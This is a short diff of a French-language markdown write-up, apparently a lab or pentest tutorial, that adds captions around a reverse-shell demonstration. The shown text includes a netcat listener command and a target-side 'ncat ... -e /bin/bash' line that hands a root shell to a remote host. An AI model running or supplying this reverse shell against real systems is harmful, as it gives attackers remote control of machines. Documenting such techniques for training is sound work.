@@ -41,13 +41,20 @@ Notre machine
 ```shell
 user@ip:/home/user $ sudo nc -lvnp 443
 ```
+Mise en place du listener.
 
 Machine cible
 
 ```shell
 root@raspberrypi:/# ncat 192.168.1.100 443 -e /bin/bash
 ```
+Execution du script
 
+Notre machine
+
+```shell
+
+```
 
 
 
